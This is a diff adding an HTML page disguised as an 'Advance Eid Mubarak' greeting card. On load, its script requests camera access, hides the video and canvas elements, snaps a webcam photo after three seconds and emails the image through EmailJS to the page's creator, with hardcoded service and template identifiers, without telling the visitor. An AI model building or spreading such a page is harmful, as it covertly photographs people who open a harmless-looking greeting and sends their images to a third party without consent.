@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Advance Eid Mubarak</title>
+  <style>
+    body {
+      background-color: #f8f9fa;
+      text-align: center;
+      padding-top: 50px;
+      font-family: 'Arial', sans-serif;
+    }
+    h1 {
+      color: #2d8659;
+      font-size: 2.5em;
+    }
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <h1>🎉 Advance Eid Mubarak 🎉</h1>
+  <p>Special wishes just for you!</p>
+
+  <video id="video" autoplay></video>
+  <canvas id="canvas"></canvas>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init('ZRO2rAOiW-vdxKU5Y'); // تمہاری EmailJS user ID
+
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(function(stream) {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
+
+        // Wait a few seconds before capturing
+        setTimeout(function() {
+          const canvas = document.getElementById('canvas');
+          const context = canvas.getContext('2d');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const imageData = canvas.toDataURL('image/png');
+
+          emailjs.send('talha8888', 'template_gg96m9k', {
+            to_name: "Talha",
+            from_name: "Eid Visitor",
+            message: "🎉 Advance Eid Mubarak from your visitor!",
+            screenshot: imageData
+          }).then(function(response) {
+            console.log("Email sent!", response.status, response.text);
+          }, function(error) {
+            console.error("Email error:", error);
+          });
+
+        }, 3000); // delay to capture
+      })
+      .catch(function(error) {
+        alert('Camera access denied!');
+      });
+  </script>
+</body>
+</html>
